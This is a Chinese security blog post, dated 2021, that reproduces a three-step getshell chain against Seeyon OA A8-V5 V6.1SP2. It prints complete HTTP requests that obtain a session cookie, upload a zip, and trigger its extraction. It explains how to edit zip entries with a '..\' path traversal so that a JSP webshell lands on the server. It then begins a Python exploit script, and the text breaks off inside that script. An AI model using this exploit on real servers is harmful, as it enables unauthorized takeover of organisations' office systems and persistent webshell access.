@@ -1,0 +1,333 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>致远OA 组合getshell | Liqun</title><meta name="keywords" content="漏洞复现,致远oa"><meta name="author" content="Li qun"><meta name="copyright" content="Li qun"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="测试版本为： 致远A8-V5协同管理软件 V6.1SP2自行搭建环境： Getshell分三步1.获取cookie信息   2.上传压缩文件    3.解压压缩文件得到shell  获取cookie信息漏洞文件 &#x2F;seeyon&#x2F;thirdpartyController.do   数据包： 12345678910111213POST &#x2F;seeyon&#x2F;thirdpartyContr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="致远OA 组合getshell">
+<meta property="og:url" content="https://www.ailiqun.xyz/2021/04/10/%E8%87%B4%E8%BF%9COA-%E7%BB%84%E5%90%88getshell/index.html">
+<meta property="og:site_name" content="Liqun">
+<meta property="og:description" content="测试版本为： 致远A8-V5协同管理软件 V6.1SP2自行搭建环境： Getshell分三步1.获取cookie信息   2.上传压缩文件    3.解压压缩文件得到shell  获取cookie信息漏洞文件 &#x2F;seeyon&#x2F;thirdpartyController.do   数据包： 12345678910111213POST &#x2F;seeyon&#x2F;thirdpartyContr">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post2.webp">
+<meta property="article:published_time" content="2021-04-10T10:13:00.000Z">
+<meta property="article:modified_time" content="2021-05-05T13:37:44.799Z">
+<meta property="article:author" content="Li qun">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="致远oa">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post2.webp"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.ailiqun.xyz/2021/04/10/%E8%87%B4%E8%BF%9COA-%E7%BB%84%E5%90%88getshell/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//s4.cnzz.com"/><link rel="stylesheet" href="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script async="async" data-pjax="data-pjax" src="https://s4.cnzz.com/z_stat.php?id=1279691978&amp;web_id=1279691978"></script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-05-05 21:37:44'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><link rel="stylesheet" href="/css/鼠标.css"><link rel="stylesheet" href="/css/昵称颜色.css"><link rel="stylesheet" href="/css/页脚透明.css"><link rel="stylesheet" href="/css/滚动条.css"><link rel="stylesheet" href="/css/个性标签.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/StaticFile_HEXO@latest/butterfly/css/font-awesome-animation.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@master/Hexo/css/iconfont.min.css"><link rel="stylesheet" href="https://at.alicdn.com/t/font_2378142_a0rdikziucl.css"><meta name="generator" content="Hexo 5.3.0"></head><body><a href="javascript:void(0);" onclick="preloader.endLoading();" title="！！！！嫌慢就点一下！！！！"><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="scarecrow"><div class="scarecrow__hat"><div class="scarecrow__ribbon"></div></div><div class="scarecrow__head"><div class="scarecrow__eye"></div><div class="scarecrow__eye"></div><div class="scarecrow__mouth"></div><div class="scarecrow__pipe"></div></div><div class="scarecrow__body"><div class="scarecrow__glove scarecrow__glove--l"></div><div class="scarecrow__sleeve scarecrow__sleeve--l"></div><div class="scarecrow__bow"></div><div class="scarecrow__shirt"></div><div class="scarecrow__coat"></div><div class="scarecrow__waistcoat"></div><div class="scarecrow__sleeve scarecrow__sleeve--r"></div><div class="scarecrow__glove scarecrow__glove--r"></div><div class="scarecrow__coattails"></div><div class="scarecrow__pants"></div></div><div class="scarecrow__arms"></div><div class="scarecrow__leg">  </div></div></div></a><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/txx.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">40</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw iconfont iconcircle"></i><span> 在线工具</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/2022/07/24/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/"><i class="fa-fw iconfont iconhuizong faa-vertical animated"></i><span> 工具汇总入口</span></a></li><li><a class="site-page" href="/#"><span> ----信息收集----</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://x.threatbook.cn/"><i class="fa-fw iconfont iconsaomiao2"></i><span> 微步在线</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://community.riskiq.com/home/"><i class="fa-fw iconfont icon-shuaxin"></i><span> RiskIQ</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/url/"><i class="fa-fw iconfont iconbingdu"></i><span> VirusTotal扫毒</span></a></li><li><a class="site-page" href="/#"><span> -资产测绘-</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://fofa.so/"><i class="fa-fw iconfont iconf"></i><span> Fofa  网络安全搜索引擎</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.shodan.io/"><i class="fa-fw iconfont iconcircle"></i><span> Shodan网络空间搜索引擎</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.zoomeye.org/"><i class="fa-fw iconfont iconyanjing"></i><span> 钟馗之眼-ZoomEye</span></a></li><li><a class="site-page" href="/#"><span> -指纹识别-</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.yunsee.cn/"><i class="fa-fw iconfont iconwangzhan"></i><span> 云悉CMS指纹识别平台</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://scan.top15.cn/web/"><i class="fa-fw iconfont iconTx"></i><span> TScan 指纹识别</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw iconfont iconwangzhan"></i><span> 实用小工具</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/%E5%9C%A8%E7%BA%BF%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7"><i class="fa-fw iconfont iconjiemi"></i><span> 在线加解密工具</span></a></li><li><a class="site-page" href="/shell.html"><i class="fa-fw iconfont iconcircle"></i><span> 反弹shell生成</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间排序</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post2.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Liqun</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw iconfont iconcircle"></i><span> 在线工具</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/2022/07/24/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/"><i class="fa-fw iconfont iconhuizong faa-vertical animated"></i><span> 工具汇总入口</span></a></li><li><a class="site-page" href="/#"><span> ----信息收集----</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://x.threatbook.cn/"><i class="fa-fw iconfont iconsaomiao2"></i><span> 微步在线</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://community.riskiq.com/home/"><i class="fa-fw iconfont icon-shuaxin"></i><span> RiskIQ</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/url/"><i class="fa-fw iconfont iconbingdu"></i><span> VirusTotal扫毒</span></a></li><li><a class="site-page" href="/#"><span> -资产测绘-</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://fofa.so/"><i class="fa-fw iconfont iconf"></i><span> Fofa  网络安全搜索引擎</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.shodan.io/"><i class="fa-fw iconfont iconcircle"></i><span> Shodan网络空间搜索引擎</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.zoomeye.org/"><i class="fa-fw iconfont iconyanjing"></i><span> 钟馗之眼-ZoomEye</span></a></li><li><a class="site-page" href="/#"><span> -指纹识别-</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.yunsee.cn/"><i class="fa-fw iconfont iconwangzhan"></i><span> 云悉CMS指纹识别平台</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://scan.top15.cn/web/"><i class="fa-fw iconfont iconTx"></i><span> TScan 指纹识别</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw iconfont iconwangzhan"></i><span> 实用小工具</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/%E5%9C%A8%E7%BA%BF%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7"><i class="fa-fw iconfont iconjiemi"></i><span> 在线加解密工具</span></a></li><li><a class="site-page" href="/shell.html"><i class="fa-fw iconfont iconcircle"></i><span> 反弹shell生成</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间排序</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">致远OA 组合getshell</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-04-10T10:13:00.000Z" title="发表于 2021-04-10 18:13:00">2021-04-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-05T13:37:44.799Z" title="更新于 2021-05-05 21:37:44">2021-05-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2021/04/10/%E8%87%B4%E8%BF%9COA-%E7%BB%84%E5%90%88getshell/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2021/04/10/%E8%87%B4%E8%BF%9COA-%E7%BB%84%E5%90%88getshell/" itemprop="commentCount"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="测试版本为：-致远A8-V5协同管理软件-V6-1SP2"><a href="#测试版本为：-致远A8-V5协同管理软件-V6-1SP2" class="headerlink" title="测试版本为： 致远A8-V5协同管理软件 V6.1SP2"></a>测试版本为： 致远A8-V5协同管理软件 V6.1SP2</h2><h3 id="自行搭建环境："><a href="#自行搭建环境：" class="headerlink" title="自行搭建环境："></a>自行搭建环境：</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%87%B4%E8%BF%9C1.webp" alt="image"></p>
+<h3 id="Getshell分三步"><a href="#Getshell分三步" class="headerlink" title="Getshell分三步"></a>Getshell分三步</h3><pre><code>1.获取cookie信息  
+2.上传压缩文件   
+3.解压压缩文件得到shell
+</code></pre>
+<h4 id="获取cookie信息"><a href="#获取cookie信息" class="headerlink" title="获取cookie信息"></a>获取cookie信息</h4><p>漏洞文件</p>
+<pre><code>/seeyon/thirdpartyController.do 
+</code></pre>
+<p>数据包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;seeyon&#x2F;thirdpartyController.do HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.88:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 133</span><br><span class="line"></span><br><span class="line">method&#x3D;access&amp;enc&#x3D;TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&amp;clientPath&#x3D;127.0.0.1</span><br></pre></td></tr></table></figure>
+<p> 获取到cookie<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%87%B4%E8%BF%9C2.webp" alt="image"></p>
+<h4 id="上传压缩文件"><a href="#上传压缩文件" class="headerlink" title="上传压缩文件"></a>上传压缩文件</h4><p>漏洞点：</p>
+<pre><code>/seeyon/fileUpload.do?method=processUpload&amp;maxSize=
+</code></pre>
+<p>数据包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;seeyon&#x2F;fileUpload.do?method&#x3D;processUpload&amp;maxSize&#x3D; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.88:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.1.88:8080&#x2F;seeyon&#x2F;fileUpload.do?method&#x3D;processUpload&amp;maxSize&#x3D;</span><br><span class="line">Cookie: JSESSIONID&#x3D;A4D1CCA965228F523B70833968568BE6</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------1416682316313</span><br><span class="line">Content-Length: 1179</span><br><span class="line"></span><br><span class="line">-----------------------------1416682316313</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;type&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------1416682316313</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;extensions&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------1416682316313</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;applicationCategory&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------1416682316313</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;destDirectory&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------1416682316313</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;destFilename&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------1416682316313</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;maxSize&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------1416682316313</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;isEncrypt&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------1416682316313</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file1&quot;; filename&#x3D;&quot;123.zip&quot;</span><br><span class="line">Content-Type: application&#x2F;x-zip-compressed</span><br><span class="line"></span><br><span class="line">zip文件</span><br><span class="line">-----------------------------1416682316313--</span><br></pre></td></tr></table></figure>
+<p>直接替换上传数据包cookie与地址信息发送会返回一个fileurls值<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%87%B4%E8%BF%9C3.webp" alt="image"></p>
+<h3 id="3-解压文件得到shell"><a href="#3-解压文件得到shell" class="headerlink" title="3.解压文件得到shell"></a>3.解压文件得到shell</h3><p>漏洞文件</p>
+<pre><code>/seeyon/ajax.do
+</code></pre>
+<p>数据包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;seeyon&#x2F;ajax.do HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.88:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: JSESSIONID&#x3D;A4D1CCA965228F523B70833968568BE6</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 142</span><br><span class="line"></span><br><span class="line">method&#x3D;ajaxAction&amp;managerName&#x3D;portalDesignerManager&amp;managerMethod&#x3D;uploadPageLayoutAttachment&amp;arguments&#x3D;[0,&quot;2021-04-10&quot;,&quot;2708692024033719158&quot;]</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%87%B4%E8%BF%9C4.webp" alt="image"></p>
+<h2 id="验证结果"><a href="#验证结果" class="headerlink" title="验证结果"></a>验证结果</h2><p>访问压缩包里的文件进行验证 解压后文件位置位于 </p>
+<pre><code>/seeyon/common/designer/pageLayout/压缩包里文件名
+</code></pre>
+<p>成功getshell<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%87%B4%E8%BF%9C5.webp" alt="image"></p>
+<h2 id="注：制作zip文件"><a href="#注：制作zip文件" class="headerlink" title="注：制作zip文件"></a>注：制作zip文件</h2><p>新建两个文件</p>
+<pre><code>layout.xml  必须存在否则在利用解压漏洞时会解压失败空内容即可
+12345678.txt  可是任意名称与内容 想上传webshell替换成webshell内容与jsp后缀即可
+</code></pre>
+<p>压缩成zip文件<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%87%B4%E8%BF%9C6.webp" alt="image"></p>
+<p>使用文本编辑zip包把shell文件名前三位替换成..\修改前和修改后位数不能变否则zip文件损坏<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%87%B4%E8%BF%9C7.webp" alt="image"></p>
+<p>保存查看效果<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%87%B4%E8%BF%9C8.webp" alt="image"></p>
+<p>反正能用：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">la = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_random_str</span>(<span class="params">randomlength=<span class="number">16</span></span>):</span></span><br><span class="line">  random_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  base_str = <span class="string">&#x27;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line">  length = <span class="built_in">len</span>(base_str) - <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(randomlength):</span><br><span class="line">    random_str += base_str[random.randint(<span class="number">0</span>, length)]</span><br><span class="line">  <span class="keyword">return</span> random_str</span><br><span class="line"></span><br><span class="line">mm = generate_random_str(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">webshell_name1 = mm+<span 